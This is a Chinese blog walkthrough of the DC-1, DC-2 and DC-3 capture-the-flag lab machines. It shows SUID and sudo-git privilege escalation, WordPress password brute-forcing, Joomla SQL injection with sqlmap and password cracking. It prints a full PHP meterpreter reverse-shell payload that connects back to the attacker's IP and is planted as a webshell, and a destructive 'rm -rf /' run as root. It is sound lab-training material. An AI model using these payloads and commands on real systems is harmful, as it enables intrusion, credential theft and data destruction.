<p>我们回到web页面</p>
<blockquote>
<p> 输入账号:admin</p>
</blockquote>
<blockquote>
<p> 输入密码:orange</p>
</blockquote>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829233259920.png" alt="image-20220829233259920"></p>
<p>已经登陆，芜湖起飞</p>
<p>flag3在如图</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829233421218.png" alt="image-20220829233421218"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829233449346.png" alt="image-20220829233449346"></p>
<p>我们在flag3获得了这句话</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Special PERMS will <span class="built_in">help</span> FIND the passwd - but you<span class="string">&#x27;ll need to -exec that command to work out how to get what&#x27;</span>s <span class="keyword">in</span> the shadow.</span><br><span class="line"><span class="comment"># 特殊的perm将有助于查找passwd，但您需要-exec该命令来确定如何获取阴影中的内容。</span></span><br></pre></td></tr></table></figure>

<p>也就是说我需要找一下关于passwd的东西，先看看&#x2F;etc&#x2F;passwd</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829234740943.png" alt="image-20220829234740943"></p>
<p>flag4地址可能在&#x2F;home&#x2F;flag4</p>
<p>我们进去看看</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829234844048.png" alt="image-20220829234844048"></p>
<p>找到地方了，但是没有权限，得先提权。。。</p>
<p>先查找提权的软件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829235024805.png" alt="image-20220829235024805"></p>
<p>原来find也有提权能力，我们用find命令包含的-exec参数进行提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br></pre></td></tr></table></figure>

<p>这个命令中的&#x2F;bin&#x2F;sh是linux内核和用户之间的命令解释器，可以将我们的命令解释并发送给linux内核。</p>
<p>提权后发现我们的权限已经升级为root了</p>
<p>我们回头看看&#x2F;home&#x2F;flag4里的文件</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829235307752.png" alt="image-20220829235307752"></p>
<p>额，flag4在root目录</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829235354767.png" alt="image-20220829235354767"></p>
<p>flag4到手。。。</p>
<p>靶机也该完成自己的使命了</p>
<p>我记得我是root权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf /</span><br></pre></td></tr></table></figure>

<h3 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h3><p>arp扫描一下找到目标ip为<code>192.168.10.130</code></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220905103729449.png" alt="image-20220905103729449"></p>
<p>老规矩，先用nmap扫描一下目标主机，检测其开放端口和开放服务</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912191533408.png" alt="image-20220912191533408"></p>
<p>我们访问一下目标的80端口</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220905111803400.png" alt="image-20220905111803400"></p>
<p>这里直接跳转了<code>http://dc-2/</code>,而我们本地hosts文件没有这个域名，所以直接报错了，现在我们得配置一下hosts文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220905112028066.png" alt="image-20220905112028066"></p>
<p>然后我们回到浏览器刷新，可以看出这是一个wordpress博客cms</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220905112120177.png" alt="image-20220905112120177"></p>
<p>我们可以看到首页最右边有个flag的菜单栏</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912181533565.png" alt="image-20220912181533565"></p>
<p>这里说要用cewl来生成一个密码字典</p>
<p>所以我们用到下面的工具</p>
<p>kali密码攻击工具——Cewl</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w dc2_password.txt http://dc-2/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912182123790.png" alt="image-20220912182123790"></p>
<p>然后我们采用WPScanKali Linux默认自带的一款漏洞扫描工具来手机目标博客信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url dc-2 -e u</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912184150165.png" alt="image-20220912184150165"></p>
<p>枚举到三个账号名，写入到dc2_user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">cat</span> &gt;&gt; dc2_user.txt &lt;&lt; <span class="string">EOF </span></span><br><span class="line"><span class="string">heredoc&gt; admin                   </span></span><br><span class="line"><span class="string">heredoc&gt; jerry</span></span><br><span class="line"><span class="string">heredoc&gt; tom               </span></span><br><span class="line"><span class="string">heredoc&gt; EOF</span></span><br></pre></td></tr></table></figure>

<p>爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url dc-2 -U dc2_user.txt -P dc2_password.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SUCCESS] - jerry / adipiscing                                                                                                                                                                                                                   </span><br><span class="line">[SUCCESS] - tom / parturient  </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912185616538.png" alt="image-20220912185616538"></p>
<p>我们扫描一下博客的后台地址</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912190519634.png" alt="image-20220912190519634"></p>
<p>登录进入wordpress</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912191038713.png" alt="image-20220912191038713"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912191122865.png" alt="image-20220912191122865"></p>
<p>拿到flag2，也提示了我们不能直接通过cms漏洞拿到shell了，让我们找另一种方法</p>
<p>最后还是tom登录上了ssh</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912191801459.png" alt="image-20220912191801459"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912192619233.png" alt="image-20220912192619233"></p>
<p>权限巨低</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="comment">#查看上面得到path路径的所有文件</span></span><br><span class="line"><span class="comment">#运行结果 /home/tom/usr/bin</span></span><br><span class="line"><span class="built_in">echo</span> /home/tom/usr/bin/*</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912204229177.png" alt="image-20220912204229177"></p>
<p>使用vi进行提权</p>
<p>先进入vi编辑器界面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br></pre></td></tr></table></figure>

<p>然后按Esc键，输入</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:set shell=<span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>

<p>设置好shell并回车，接着输入 </p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">:shell</span></span><br></pre></td></tr></table></figure>

<p> 回车，启动shell</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912204858088.png" alt="image-20220912204858088"></p>
<p>写入环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/</span><br><span class="line"> </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912204927994.png" alt="image-20220912204927994"></p>
<p>登录jerry</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br><span class="line">密码：adipiscing</span><br></pre></td></tr></table></figure>

<p>直接查找flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912205252880.png" alt="image-20220912205252880"></p>
<p>找到flag4</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912205413784.png" alt="image-20220912205413784"></p>
<p>看看能不能SUID提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912205743401.png" alt="image-20220912205743401"></p>
<p>看一下能用root权限的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912210153663.png" alt="image-20220912210153663"></p>
<p>发现只有git。。。好吧</p>
<p>发现git能使用root的权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="built_in">help</span> config</span><br></pre></td></tr></table></figure>

<p>回车然后输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash  (这里bash也可以换成sh)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912210719620.png" alt="image-20220912210719620"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@DC-2:/home/tom<span class="comment"># cd ~</span></span><br><span class="line">root@DC-2:~<span class="comment"># ls</span></span><br><span class="line">final-flag.txt</span><br><span class="line">root@DC-2:~<span class="comment"># cat final-flag.txt </span></span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">&#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it&#x27;</span>s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912211352919.png" alt="image-20220912211352919"></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权</a></p>
<h3 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h3><p>攻击机Kali ： </p>
<blockquote>
<p>IP地址：192.168.245.132</p>
</blockquote>
<p>靶机 ：</p>
<blockquote>
<p>IP地址：192.168.245.133</p>
</blockquote>
<p>刚开始的DC-3靶机即使换了NAT网络还是用不了的，无法检测到DC-3的ip，我们得去救援模式将网络修好</p>
<p>首先，开启DC-3靶机，然后疯狂按e</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-09-26_09-29-01.png" alt="Snipaste_2022-09-26_09-29-01"></p>
<p>找到下面ro这个地方，将ro替换成为rw signie init&#x3D;&#x2F;bin&#x2F;bash</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-09-26_09-30-32.png" alt="Snipaste_2022-09-26_09-30-32"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-09-26_09-31-22.png" alt="Snipaste_2022-09-26_09-31-22"></p>
<p>然后按ctrl+x，重启服务进入如下界面，如果并没进入此界面表示你上面修改错误，重启电脑再次进行修改</p>
<p>查看一下ip，发现ip是没有的</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-09-26_09-31-52.png" alt="Snipaste_2022-09-26_09-31-52"></p>
<p>我们修改一下网卡配置文件</p>
<p>编辑&#x2F;etc&#x2F;network&#x2F;interfaces将配置改成下面，保存退出</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-09-26_09-33-14.png" alt="Snipaste_2022-09-26_09-33-14"></p>
<p>使用dhclient命令重新获取IP，然后我们就得到了ip(垃圾话)</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220926105814524.png" alt="image-20220926105814524"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-09-26_09-34-51.png" alt="Snipaste_2022-09-26_09-34-51"></p>
<p>老规矩，扫描本地ip</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220926094926539.png" alt="image-20220926094926539"></p>
<p>扫描端口和服务</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220926110309888.png" alt="image-20220926110309888"></p>
<p>仅开放了80端口</p>
<p>同时发现了 Joomla! - Open Source Content Managemen</p>
<p>浏览器看看</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220926112717159.png" alt="image-20220926112717159"></p>
<p>使用 joomscan 专用扫描器，来获取更详细的信息</p>
<p>Kali 2022.1 版默认没有 joomscan 专用扫描器，需要安装</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rezasp/joomscan.git</span><br><span class="line"><span class="built_in">cd</span> joomscan</span><br><span class="line">perl joomscan.pl</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl joomscan.pl -u http://192.168.245.133/</span><br></pre></td></tr></table></figure>

<p>知道了版本</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927084538386.png" alt="image-20220927084538386"></p>
<p>通过 searchsploit 查看是否有可以用的 EXP</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927084928582.png" alt="image-20220927084928582"></p>
<p>可以看到有些 SQL 注入漏洞的文本，可以看一下</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927085248969.png" alt="image-20220927085248969"></p>
<p>按照提示，我们就用 sqlmap 跑一下吧</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927085809795.png" alt="image-20220927085809795"></p>
<p>爆出所有数据库</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927090425935.png" alt="image-20220927090425935"></p>
<p>利用 joomladb 数据库，爆数据表</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.245.133/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -tables -p list[fullordering] </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927094821498.png" alt="image-20220927094821498"></p>
<p>利用#_users 数据表，查字段</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.245.133/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="string">&quot;joomladb&quot;</span> -T <span class="string">&quot;#__users&quot;</span> --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927173035684.png" alt="image-20220927173035684"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927173226658.png" alt="image-20220927173226658"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u <span class="string">&quot;http://192.168.245.133/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="string">&quot;joomladb&quot;</span> -T <span class="string">&quot;#__users&quot;</span> -C <span class="string">&quot;name,password&quot;</span> --dump  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p>导出#_users 数据表里所有数据</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927173427864.png" alt="image-20220927173427864"></p>
<p>获得网站后台登录用户名admin和密码hash值：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin  <span class="comment">#用户名</span></span><br><span class="line">$2<span class="keyword">y</span>$1<span class="number">0</span>$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu  <span class="comment">#密码hash值</span></span><br></pre></td></tr></table></figure>

<p>创建一个DC-3password.txt，然后写入password</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927174316180.png" alt="image-20220927174316180"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john DC-3password.txt --show</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927175456943.png" alt="image-20220927175456943"></p>
<p>利用通过 Joomscan 扫出的几个目录，就包含管理员登录界面</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927195503974.png" alt="image-20220927195503974"></p>
<p>我们尝试进入一下后台页面</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927201025787.png" alt="image-20220927201025787"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.245.133/administrator/</span><br><span class="line">admin</span><br><span class="line">snoopy</span><br></pre></td></tr></table></figure>

<p>上传webshell</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927201209616.png" alt="image-20220927201209616"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928153800067.png" alt="image-20220928153800067"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928153852429.png" alt="image-20220928153852429"></p>
<p>创建名字是test的php文件</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928153918438.png" alt="image-20220928153918438"></p>
<p>首先我们来到kali生成一个反弹shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.245.132 lport=7777 -o test.php</span><br></pre></td></tr></table></figure>

<p>把这个贴到网站刚刚创建好的php文件里面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php /**/ error_reporting(0); <span class="variable">$ip</span> = <span class="string">&#x27;192.168.245.132&#x27;</span>; <span class="variable">$port</span> = 7777; <span class="keyword">if</span> ((<span class="variable">$f</span> = &#x27;stream_socket_client&#x27;) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="string">&quot;tcp://&#123;<span class="variable">$ip</span>&#125;:&#123;<span class="variable">$port</span>&#125;&quot;</span>); <span class="variable">$s_type</span> = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">&#x27;fsockopen&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="variable">$s_type</span> = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">&#x27;socket_create&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(AF_INET, SOCK_STREAM, SOL_TCP); <span class="variable">$res</span> = @socket_connect(<span class="variable">$s</span>, <span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="keyword">if</span> (!<span class="variable">$res</span>) &#123; die(); &#125; <span class="variable">$s_type</span> = <span class="string">&#x27;socket&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s_type</span>) &#123; die(<span class="string">&#x27;no socket funcs&#x27;</span>); &#125; <span class="keyword">if</span> (!<span class="variable">$s</span>) &#123; die(<span class="string">&#x27;no socket&#x27;</span>); &#125; switch (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: <span class="variable">$len</span> = fread(<span class="variable">$s</span>, 4); <span class="built_in">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: <span class="variable">$len</span> = socket_read(<span class="variable">$s</span>, 4); <span class="built_in">break</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$len</span>) &#123; die(); &#125; <span class="variable">$a</span> = unpack(<span class="string">&quot;Nlen&quot;</span>, <span class="variable">$len</span>); <span class="variable">$len</span> = <span class="variable">$a</span>[<span class="string">&#x27;len&#x27;</span>]; <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>; <span class="keyword">while</span> (strlen(<span class="variable">$b</span>) &lt; <span class="variable">$len</span>) &#123; switch (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: <span class="variable">$b</span> .= fread(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="built_in">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: <span class="variable">$b</span> .= socket_read(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="built_in">break</span>; &#125; &#125; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msgsock&#x27;</span>] = <span class="variable">$s</span>; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msgsock_type&#x27;</span>] = <span class="variable">$s_type</span>; <span class="keyword">if</span> (extension_loaded(<span class="string">&#x27;suhosin&#x27;</span>) &amp;&amp; ini_get(<span class="string">&#x27;suhosin.executor.disable_eval&#x27;</span>)) &#123; <span class="variable">$suhosin_bypass</span>=create_function(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>); <span class="variable">$suhosin_bypass</span>(); &#125; <span class="keyword">else</span> &#123; <span class="built_in">eval</span>(<span class="variable">$b</span>); &#125; die();</span><br></pre></td></tr></table></figure>

<p>然后点击左上角save</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928150452342.png" alt="image-20220928150452342"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我们建立kali的监听</span></span><br><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># msfconsole                                                                           </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 &gt; use exploit/multi/handler </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; show options </span></span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; set lhost 192.168.245.132</span></span><br><span class="line">lhost =&gt; 192.168.245.132</span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; set lport 7777</span></span><br><span class="line">lport =&gt; 7777</span><br><span class="line"><span class="comment">#msf6 exploit(multi/handler) &gt; exploit </span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928154521471.png" alt="image-20220928154521471"></p>
<p>然后访问一下下面这个地址激活反弹脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.245.133/templates/protostar/test.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928153730034.png" alt="image-20220928153730034"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928154450275.png" alt="image-20220928154450275"></p>
<p>ls看一眼文件内容</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928154850666.png" alt="image-20220928154850666"></p>
<p>看看sysinfo</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928154928576.png" alt="image-20220928154928576"></p>
<p>输入shell</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928155138240.png" alt="image-20220928155138240"></p>
<p>whoami看看账号</p>
